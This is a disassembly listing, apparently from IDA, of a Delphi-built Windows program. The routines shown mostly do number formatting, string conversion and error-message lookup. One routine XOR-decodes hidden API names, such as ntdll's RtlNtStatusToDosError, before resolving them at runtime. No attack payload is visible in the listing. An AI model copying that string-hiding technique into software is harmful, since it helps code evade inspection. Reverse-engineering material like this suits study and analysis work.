		pop	ecx
		pop	ebp
		retn	4
sub_405CF8	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 1
dword_405DC8	dd 2Dh			; DATA XREF: sub_405CF8+54o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405DCC	proc near		; CODE XREF: sub_40609C+43p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		mov	esi, edx
		mov	[ebp+var_4], eax
		mov	edi, [ebp+arg_0]
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_405E34
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, edi
		mov	edx, [ebp+var_4]
		call	sub_4039E8
		push	ebx
		mov	eax, [edi]
		call	sub_403C24
		push	eax
		mov	eax, esi
		cdq
		xor	eax, edx
		sub	eax, edx
		mov	edx, eax
		pop	eax
		sub	edx, eax
		test	esi, esi
		setnle	cl
		mov	eax, edi
		call	sub_405CF8
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_405E3B

loc_405E2B:				; CODE XREF: sub_405DCC+6Dj
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_405E34:				; DATA XREF: sub_405DCC+1Co
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_405E2B
; ---------------------------------------------------------------------------

loc_405E3B:				; CODE XREF: sub_405DCC+67j
					; DATA XREF: sub_405DCC+5Ao
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_405DCC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_405E44	proc near		; CODE XREF: sub_406144+15p

var_14		= byte ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		push	ecx
		mov	edi, edx
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_405EE0
		test	ebx, ebx
		setl	[esp+14h+var_14]
		mov	eax, edi
		mov	edx, 0Bh
		call	sub_403F0C
		mov	esi, 0Bh

loc_405E6C:				; CODE XREF: sub_405E44+58j
		mov	eax, ebx
		mov	ecx, 0Ah
		cdq
		idiv	ecx
		mov	eax, edx
		cdq
		xor	eax, edx
		sub	eax, edx
		mov	ebp, eax
		mov	eax, ebx
		mov	ecx, 0Ah
		cdq
		idiv	ecx
		mov	ebx, eax
		mov	eax, edi
		call	sub_403E7C
		lea	edx, [ebp+30h]
		mov	[eax+esi-1], dl
		dec	esi
		test	ebx, ebx
		jnz	short loc_405E6C
		cmp	[esp+14h+var_14], 0
		jz	short loc_405EB1
		mov	eax, edi
		call	sub_403E7C
		mov	byte ptr [eax+esi-1], 2Dh
		dec	esi

loc_405EB1:				; CODE XREF: sub_405E44+5Ej
		test	esi, esi
		jle	short loc_405EEC
		mov	eax, edi
		call	sub_403E7C
		push	eax
		mov	eax, edi
		call	sub_403E7C
		add	eax, esi
		mov	ebx, 0Bh
		sub	ebx, esi
		mov	ecx, ebx
		pop	edx
		call	sub_402664
		mov	edx, ebx
		mov	eax, edi
		call	sub_403F0C
		jmp	short loc_405EEC
; ---------------------------------------------------------------------------

loc_405EE0:				; CODE XREF: sub_405E44+Bj
		mov	eax, edi
		mov	edx, offset dword_405EFC
		call	sub_4039E8

loc_405EEC:				; CODE XREF: sub_405E44+6Fj
					; sub_405E44+9Aj
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_405E44	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 1
dword_405EFC	dd 30h			; DATA XREF: sub_405E44+9Eo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405F00	proc near		; CODE XREF: sub_40618C+19p

var_1		= byte ptr -1
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	esi, eax
		cmp	[ebp+arg_4], 0
		jnz	short loc_405F13
		cmp	[ebp+arg_0], 0

loc_405F13:				; CODE XREF: sub_405F00+Dj
		jz	loc_405FCD
		cmp	[ebp+arg_4], 0
		jnz	short loc_405F28
		cmp	[ebp+arg_0], 0
		setb	al
		jmp	short loc_405F2B
; ---------------------------------------------------------------------------

loc_405F28:				; CODE XREF: sub_405F00+1Dj
		setl	al

loc_405F2B:				; CODE XREF: sub_405F00+26j
		mov	[ebp+var_1], al
		mov	eax, esi
		mov	edx, 14h
		call	sub_403F0C
		mov	ebx, 14h

loc_405F3F:				; CODE XREF: sub_405F00+83j
					; sub_405F00+89j
		push	0
		push	0Ah
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+arg_4]
		call	sub_4044E0
		test	edx, edx
		jge	short loc_405F59
		neg	eax
		adc	edx, 0
		neg	edx

loc_405F59:				; CODE XREF: sub_405F00+50j
		mov	edi, eax
		push	0
		push	0Ah
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+arg_4]
		call	sub_404464
		mov	[ebp+arg_0], eax
		mov	[ebp+arg_4], edx
		mov	eax, esi
		call	sub_403E7C
		lea	edx, [edi+30h]
		mov	[eax+ebx-1], dl
		dec	ebx
		cmp	[ebp+arg_4], 0
		jnz	short loc_405F3F
		cmp	[ebp+arg_0], 0
		jnz	short loc_405F3F
		cmp	[ebp+var_1], 0
		jz	short loc_405F9E
		mov	eax, esi
		call	sub_403E7C
		mov	byte ptr [eax+ebx-1], 2Dh
		dec	ebx

loc_405F9E:				; CODE XREF: sub_405F00+8Fj
		test	ebx, ebx
		jle	short loc_405FD9
		mov	eax, esi
		call	sub_403E7C
		push	eax
		mov	eax, esi
		call	sub_403E7C
		add	eax, ebx
		mov	edi, 14h
		sub	edi, ebx
		mov	ecx, edi
		pop	edx
		call	sub_402664
		mov	edx, edi
		mov	eax, esi
		call	sub_403F0C
		jmp	short loc_405FD9
; ---------------------------------------------------------------------------

loc_405FCD:				; CODE XREF: sub_405F00:loc_405F13j
		mov	eax, esi
		mov	edx, offset dword_405FEC
		call	sub_4039E8

loc_405FD9:				; CODE XREF: sub_405F00+A0j
					; sub_405F00+CBj
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	8
sub_405F00	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 1
dword_405FEC	dd 30h			; DATA XREF: sub_405F00+CFo

; =============== S U B	R O U T	I N E =======================================


sub_405FF0	proc near		; CODE XREF: sub_40609C+2Ap
					; sub_40609C+51p

var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		push	ecx
		mov	ebp, edx
		mov	[esp+14h+var_14], eax
		cmp	[esp+14h+var_14], 0
		jz	short loc_40607B
		mov	ebx, [esp+14h+var_14]
		mov	eax, ebp
		mov	edx, 8
		call	sub_403F0C
		mov	edi, 8

loc_406014:				; CODE XREF: sub_405FF0+58j
		mov	esi, ebx
		and	esi, 0Fh
		shr	ebx, 4
		cmp	esi, 9
		jbe	short loc_406034
		mov	eax, ebp
		call	sub_403E7C
		lea	edx, [esi+61h]
		sub	edx, 0Ah
		mov	[eax+edi-1], dl
		jmp	short loc_406045
; ---------------------------------------------------------------------------

loc_406034:				; CODE XREF: sub_405FF0+2Fj
		mov	eax, ebp
		call	sub_403E7C
		lea	edx, [esi+30h]
		sub	edx, 0
		mov	[eax+edi-1], dl

loc_406045:				; CODE XREF: sub_405FF0+42j
		dec	edi
		test	ebx, ebx
		jnz	short loc_406014
		test	edi, edi
		jbe	short loc_406087
		mov	eax, ebp
		call	sub_403E7C
		add	eax, edi
		push	eax
		mov	eax, ebp
		call	sub_403E7C
		mov	edx, eax
		mov	ebx, 8
		sub	ebx, edi
		mov	ecx, ebx
		pop	eax
		call	sub_402664
		mov	edx, ebx
		mov	eax, ebp
		call	sub_403F0C
		jmp	short loc_406087
; ---------------------------------------------------------------------------

loc_40607B:				; CODE XREF: sub_405FF0+Ej
		mov	eax, ebp
		mov	edx, offset dword_406098
		call	sub_4039E8

loc_406087:				; CODE XREF: sub_405FF0+5Cj
					; sub_405FF0+89j
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_405FF0	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 1
dword_406098	dd 30h			; DATA XREF: sub_405FF0+8Do

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40609C	proc near		; CODE XREF: sub_4061D8+1Ap

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	ebx
		push	esi
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_406126
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	[ebp+arg_4], 0
		jnz	short loc_4060BF
		cmp	[ebp+arg_0], 0

loc_4060BF:				; CODE XREF: sub_40609C+1Dj
		jz	short loc_4060FF
		mov	edx, ebx
		mov	eax, [ebp+arg_0]
		call	sub_405FF0
		mov	esi, [ebp+arg_4]
		test	esi, esi
		jz	short loc_40610B
		lea	eax, [ebp+var_4]
		push	eax
		mov	eax, [ebx]
		mov	cl, 30h
		mov	edx, 8
		call	sub_405DCC
		mov	eax, [ebp+var_4]
		push	eax
		lea	edx, [ebp+var_8]
		mov	eax, esi
		call	sub_405FF0
		mov	edx, [ebp+var_8]
		mov	eax, ebx
		pop	ecx
		call	sub_403C70
		jmp	short loc_40610B
; ---------------------------------------------------------------------------

loc_4060FF:				; CODE XREF: sub_40609C:loc_4060BFj
		mov	eax, ebx
		mov	edx, offset dword_406140
		call	sub_4039E8

loc_40610B:				; CODE XREF: sub_40609C+34j
					; sub_40609C+61j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40612D

loc_406118:				; CODE XREF: sub_40609C+8Fj
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_406126:				; DATA XREF: sub_40609C+Eo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_406118
; ---------------------------------------------------------------------------

loc_40612D:				; CODE XREF: sub_40609C+89j
					; DATA XREF: sub_40609C+77o
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn	8
sub_40609C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 1
dword_406140	dd 30h			; DATA XREF: sub_40609C+65o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_406144	proc near		; CODE XREF: sub_40DEDC+2DCp
					; sub_40DEDC+363p

var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_1], cl
		mov	esi, edx
		mov	edi, eax
		mov	ebx, [ebp+arg_0]
		mov	edx, ebx
		mov	eax, edi
		call	sub_405E44
		mov	al, [ebp+var_1]
		push	eax
		mov	eax, [ebx]
		call	sub_403C24
		push	eax
		mov	eax, esi
		cdq
		xor	eax, edx
		sub	eax, edx
		mov	edx, eax
		pop	eax
		sub	edx, eax
		test	esi, esi
		setnle	cl
		mov	eax, ebx
		call	sub_405CF8
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_406144	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40618C	proc near		; CODE XREF: sub_406B9C+AEp

var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_1], cl
		mov	esi, edx
		mov	edi, eax
		mov	ebx, [ebp+arg_0]
		mov	eax, edi
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, ebx
		call	sub_405F00
		mov	al, [ebp+var_1]
		push	eax
		mov	eax, [ebx]
		call	sub_403C24
		push	eax
		mov	eax, esi
		cdq
		xor	eax, edx
		sub	eax, edx
		mov	edx, eax
		pop	eax
		sub	edx, eax
		test	esi, esi
		setnle	cl
		mov	eax, ebx
		call	sub_405CF8
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_40618C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4061D8	proc near		; CODE XREF: sub_406284+171p
					; sub_40C5F8+69p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		mov	esi, edx
		mov	[ebp+var_4], eax
		mov	edi, [ebp+arg_0]
		mov	eax, [ebp+var_4]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, edi
		call	sub_40609C
		test	esi, esi
		jl	short loc_40620F
		mov	eax, ebx
		add	al, 0D0h
		sub	al, 0Ah
		jb	short loc_40620F
		add	al, 0F9h
		sub	al, 6
		jb	short loc_40620F
		add	al, 0E6h
		sub	al, 6
		jnb	short loc_406240

loc_40620F:				; CODE XREF: sub_4061D8+21j
					; sub_4061D8+29j ...
		push	ebx
		mov	eax, [edi]
		call	sub_403C24
		push	eax
		mov	eax, esi
		cdq
		xor	eax, edx
		sub	eax, edx
		mov	edx, eax
		pop	eax
		sub	edx, eax
		test	esi, esi
		setnle	cl
		mov	eax, edi
		call	sub_405CF8
		mov	ecx, [edi]
		mov	eax, edi
		mov	edx, offset dword_406280
		call	sub_403C70
		jmp	short loc_40626D
; ---------------------------------------------------------------------------

loc_406240:				; CODE XREF: sub_4061D8+35j
		mov	ecx, [edi]
		mov	eax, edi
		mov	edx, offset dword_406280
		call	sub_403C70
		push	ebx
		mov	eax, [edi]
		call	sub_403C24
		push	eax
		mov	eax, esi
		cdq
		xor	eax, edx
		sub	eax, edx
		mov	edx, eax
		pop	eax
		sub	edx, eax
		inc	edx
		mov	eax, edi
		mov	cl, 1
		call	sub_405CF8

loc_40626D:				; CODE XREF: sub_4061D8+66j
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_4061D8	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 1
dword_406280	dd 24h			; DATA XREF: sub_4061D8+5Co
					; sub_4061D8+6Co

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_406284	proc near		; CODE XREF: sub_4092B0+4B9p

var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
hLibModule	= dword	ptr -8
hMem		= byte ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

; FUNCTION CHUNK AT 00403270 SIZE 00000036 BYTES

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	esi, edx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_406448
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		test	ebx, 0C0000000h
		jz	short loc_4062ED
		lea	edx, [ebp+var_C]
		mov	eax, offset dword_406460
		call	sub_4064CC
		mov	eax, [ebp+var_C]
		call	sub_403E24
		push	eax		; lpProcName
		lea	edx, [ebp+var_10]
		mov	eax, offset dword_406480
		call	sub_4064CC
		mov	eax, [ebp+var_10]
		call	sub_403E24
		push	eax		; lpModuleName
		call	GetModuleHandleA_0
		push	eax		; hModule
		call	GetProcAddress_0
		test	eax, eax
		jz	short loc_4062ED
		push	ebx
		call	eax
		mov	ebx, eax

loc_4062ED:				; CODE XREF: sub_406284+27j
					; sub_406284+62j
		mov	edi, 1300h
		cmp	ebx, 834h
		jb	short loc_406332
		cmp	ebx, 0BB7h
		ja	short loc_406332
		push	2		; dwFlags
		push	0		; hFile
		lea	edx, [ebp+var_14]
		mov	eax, offset dword_406494
		call	sub_4064CC
		mov	eax, [ebp+var_14]
		call	sub_403E24
		push	eax		; lpLibFileName
		call	LoadLibraryExA_0
		mov	[ebp+hLibModule], eax
		cmp	[ebp+hLibModule], 0
		jz	short loc_406337
		or	edi, 800h
		jmp	short loc_406337
; ---------------------------------------------------------------------------

loc_406332:				; CODE XREF: sub_406284+74j
					; sub_406284+7Cj
		xor	eax, eax
		mov	[ebp+hLibModule], eax

loc_406337:				; CODE XREF: sub_406284+A4j
					; sub_406284+ACj
		xor	edx, edx
		push	ebp
		push	offset loc_406426
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		push	0		; Arguments
		push	0		; nSize
		lea	eax, [ebp+hMem]
		push	eax		; lpBuffer
		push	400h		; dwLanguageId
		push	ebx		; dwMessageId
		mov	eax, [ebp+hLibModule]
		push	eax		; lpSource
		push	edi		; dwFlags
		call	FormatMessageA
		test	eax, eax
		jz	short loc_4063D3
		xor	edx, edx
		push	ebp
		push	offset loc_4063CC
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		mov	eax, esi
		mov	edx, dword ptr [ebp+hMem]
		call	sub_403B8C
		mov	eax, [esi]
		call	sub_403C24
		mov	ebx, eax
		test	ebx, ebx
		jbe	short loc_4063B5

loc_406386:				; CODE XREF: sub_406284+12Fj
		mov	eax, [esi]
		mov	al, [eax+ebx-1]
		cmp	al, 0Dh
		jnz	short loc_40639E
		mov	eax, esi
		call	sub_403E7C
		mov	byte ptr [eax+ebx-1], 20h
		jmp	short loc_4063B0
; ---------------------------------------------------------------------------

loc_40639E:				; CODE XREF: sub_406284+10Aj
		cmp	al, 0Ah
		jnz	short loc_4063B0
		mov	eax, esi
		mov	ecx, 1
		mov	edx, ebx
		call	sub_403EC4

loc_4063B0:				; CODE XREF: sub_406284+118j
					; sub_406284+11Cj
		dec	ebx
		test	ebx, ebx
		ja	short loc_406386

loc_4063B5:				; CODE XREF: sub_406284+100j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_406409

loc_4063C2:				; CODE XREF: sub_406284+14Dj
		mov	eax, dword ptr [ebp+hMem]
		push	eax		; hMem
		call	LocalFree_1
		retn
; ---------------------------------------------------------------------------

loc_4063CC:				; DATA XREF: sub_406284+E0o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4063C2
; ---------------------------------------------------------------------------

loc_4063D3:				; CODE XREF: sub_406284+DBj
		lea	edx, [ebp+var_18]
		mov	eax, offset dword_4064A8
		call	sub_4064CC
		push	[ebp+var_18]
		push	offset dword_4064C8
		lea	eax, [ebp+var_1C]
		push	eax
		mov	cl, 30h
		mov	edx, 1
		mov	eax, ebx
		call	sub_4061D8
		push	[ebp+var_1C]
		mov	eax, esi
		mov	edx, 3
		call	sub_403CE4

loc_406409:				; CODE XREF: sub_406284+147j
					; DATA XREF: sub_406284+139o
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40642D

loc_406416:				; CODE XREF: sub_406284+1A7j
		cmp	[ebp+hLibModule], 0
		jz	short loc_406425
		mov	eax, [ebp+hLibModule]
		push	eax		; hLibModule
		call	FreeLibrary_0

loc_406425:				; CODE XREF: sub_406284+196j
		retn
; ---------------------------------------------------------------------------

loc_406426:				; DATA XREF: sub_406284+B6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_406416
; ---------------------------------------------------------------------------

loc_40642D:				; CODE XREF: sub_406284:loc_406425j
					; DATA XREF: sub_406284+18Do
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40644F

loc_40643A:				; CODE XREF: sub_406284+1C9j
		lea	eax, [ebp+var_1C]
		mov	edx, 5
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_406448:				; DATA XREF: sub_406284+16o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40643A
; ---------------------------------------------------------------------------

loc_40644F:				; CODE XREF: sub_406284+1C3j
					; DATA XREF: sub_406284+1B1o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_406284	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 15h
dword_406460	dd 1B392107h, 34210621h, 1262021h, 263A113Ah, 3A272710h
					; DATA XREF: sub_406284+2Co
		dd 27h,	0FFFFFFFFh, 9
dword_406480	dd 3931213Bh, 39317B39h, 39h, 0FFFFFFFFh, 0Ah ;	DATA XREF: sub_406284+42o
dword_406494	dd 3821303Bh, 317B3226h, 3939h,	0FFFFFFFFh, 14h	; DATA XREF: sub_406284+85o
dword_4064A8	dd 313B3C02h, 7526223Ah, 3A272730h, 203B7527h, 27303738h
					; DATA XREF: sub_406284+152o
		dd 0
		dd 0FFFFFFFFh, 1
dword_4064C8	dd 20h			; DATA XREF: sub_406284+15Fo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4064CC	proc near		; CODE XREF: sub_406284+31p
					; sub_406284+47p ...

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, edx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_40652E
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, ebx
		mov	edx, [ebp+var_4]
		call	sub_4039E8
		mov	eax, ebx
		call	sub_403E74
		mov	eax, [ebx]
		call	sub_403C24
		test	eax, eax
		jle	short loc_406518
		mov	edx, 1

loc_40650D:				; CODE XREF: sub_4064CC+4Aj
		mov	ecx, [ebx]
		xor	byte ptr [ecx+edx-1], 55h
		inc	edx
		dec	eax
		jnz	short loc_40650D

loc_406518:				; CODE XREF: sub_4064CC+3Aj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_406535

loc_406525:				; CODE XREF: sub_4064CC+67j
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40652E:				; DATA XREF: sub_4064CC+15o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_406525
; ---------------------------------------------------------------------------

loc_406535:				; CODE XREF: sub_4064CC+61j
					; DATA XREF: sub_4064CC+54o
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_4064CC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40653C	proc near		; CODE XREF: sub_4097D4+40p
					; sub_4098EC+34p ...

var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		mov	esi, ecx
		mov	[ebp+var_5], dl
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_4065C2
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_4]
		call	sub_403C24
		mov	edx, eax
		add	edx, edx
		mov	eax, esi
		call	sub_403F0C
		mov	ebx, [esi]
		mov	eax, [ebp+var_4]
		call	sub_403C24
		test	eax, eax
		jle	short loc_40659A
		mov	edx, 1

loc_406588:				; CODE XREF: sub_40653C+5Cj
		mov	ecx, [ebp+var_4]
		movzx	ecx, byte ptr [ecx+edx-1]
		mov	[ebx], cx
		add	ebx, 2
		inc	edx
		dec	eax
		jnz	short loc_406588

loc_40659A:				; CODE XREF: sub_40653C+45j
		cmp	[ebp+var_5], 0
		jz	short loc_4065AC
		mov	eax, esi
		mov	edx, offset dword_4065D8
		call	sub_403C2C

loc_4065AC:				; CODE XREF: sub_40653C+62j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4065C9

loc_4065B9:				; CODE XREF: sub_40653C+8Bj
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_4065C2:				; DATA XREF: sub_40653C+1Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4065B9
; ---------------------------------------------------------------------------

loc_4065C9:				; CODE XREF: sub_40653C+85j
					; DATA XREF: sub_40653C+78o
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_40653C	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 2
dword_4065D8	dd 0			; DATA XREF: sub_40653C+66o

; =============== S U B	R O U T	I N E =======================================


sub_4065DC	proc near		; CODE XREF: sub_40A0D4+127p
					; sub_40A0D4+227p
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	edi, edx
		mov	ebp, eax
		push	ebp		; lpString
		call	lstrlenW
		mov	edx, eax
		mov	eax, edi
		call	sub_403F0C
		mov	eax, [edi]
		call	sub_403C24
		mov	esi, eax
		test	esi, esi
		jle	short loc_406618
		mov	ebx, 1

loc_406605:				; CODE XREF: sub_4065DC+3Aj
		mov	eax, edi
		call	sub_403E7C
		mov	dl, [ebp+ebx*2-2]
		mov	[eax+ebx-1], dl
		inc	ebx
		dec	esi
		jnz	short loc_406605

loc_406618:				; CODE XREF: sub_4065DC+22j
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4065DC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_406620	proc near		; DATA XREF: CODE:00415BA8o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_406645
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417680
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40664C

loc_406644:				; CODE XREF: sub_406620+2Aj
		retn
; ---------------------------------------------------------------------------

loc_406645:				; DATA XREF: sub_406620+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_406644
; ---------------------------------------------------------------------------

loc_40664C:				; CODE XREF: sub_406620:loc_406644j
					; DATA XREF: sub_406620+1Fo
		pop	ebp
		retn
sub_406620	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_406650	proc near		; DATA XREF: CODE:00415BA4o
		sub	ds:dword_417680, 1
		retn
sub_406650	endp

; ---------------------------------------------------------------------------
off_406658	dd offset dword_40665C	; DATA XREF: sub_40707C+33r
dword_40665C	dd 4F54030Eh, 2053h, 200h ; DATA XREF: CODE:off_406658o
		db 0
		dd offset off_401018
		db 0Ch,	2 dup(0)
		db 0
		dd offset off_401018
		db 1Ch,	2 dup(0)
		dd offset loc_408CFF+1
off_40667C	dd offset dword_406680	; DATA XREF: CODE:004066B8o
dword_406680	dd 4D540C11h, 61486773h, 656C646Eh, 107372h, 0 ; DATA XREF: CODE:off_40667Co
		dd 0FFFF0000h, 0FFFFh, 6D080000h, 6F546461h, 90736C6Fh
off_4066A8	dd offset dword_4066AC	; DATA XREF: CODE:004066CCo
					; CODE:004066D4o
dword_4066AC	dd 352E020Eh, 0Ch, 1	; DATA XREF: CODE:off_4066A8o
		dd offset off_40667C
		dd 8
off_4066C0	dd offset dword_4066C4	; DATA XREF: sub_40707C+23r
dword_4066C4	dd 362E0211h, 0Ch	; DATA XREF: CODE:off_4066C0o
		dd offset off_4066A8
		dd 0FFFFFFFFh
		dd offset off_4066A8
		dd 64616D08h, 6C6F6F54h, 408D73h

; =============== S U B	R O U T	I N E =======================================


sub_4066E4	proc near		; CODE XREF: sub_40707C+19p
		mov	eax, ds:hObject
		xor	edx, edx
		mov	ds:hObject, edx
		test	eax, eax
		jz	short locret_4066FB
		push	eax		; hObject
		call	CloseHandle

locret_4066FB:				; CODE XREF: sub_4066E4+Fj
		retn
sub_4066E4	endp


; =============== S U B	R O U T	I N E =======================================


sub_4066FC	proc near		; CODE XREF: sub_408888+30Fp
					; sub_410970+78p

var_33C		= dword	ptr -33Ch
Buffer		= _MEMORY_BASIC_INFORMATION ptr	-338h
Filename	= byte ptr -31Ch
var_216		= byte ptr -216h

		push	ebx
		push	esi
		push	edi
		add	esp, 0FFFFFCD0h
		mov	[esp+33Ch+var_33C], ecx
		mov	esi, edx
		mov	ebx, eax
		push	1Ch		; dwLength
		lea	eax, [esp+340h+Buffer]
		push	eax		; lpBuffer
		push	ebx		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jnz	short loc_40672F
		cmp	[esp+33Ch+Buffer.State], 1000h
		jnz	short loc_40672F
		cmp	[esp+33Ch+Buffer.AllocationBase], 0
		jnz	short loc_406733

loc_40672F:				; CODE XREF: sub_4066FC+20j
					; sub_4066FC+2Aj
		xor	eax, eax
		jmp	short loc_406735
; ---------------------------------------------------------------------------

loc_406733:				; CODE XREF: sub_4066FC+31j
		mov	al, 1

loc_406735:				; CODE XREF: sub_4066FC+35j
		mov	ebx, eax
		test	bl, bl
		jz	loc_4067C8
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_406766
		push	104h		; nSize
		lea	eax, [esp+340h+Filename]
		push	eax		; lpFilename
		mov	eax, [esp+344h+Buffer.AllocationBase]
		push	eax		; hModule
		call	GetModuleFileNameA_0_0
		test	eax, eax
		setnz	bl
		jmp	short loc_406782
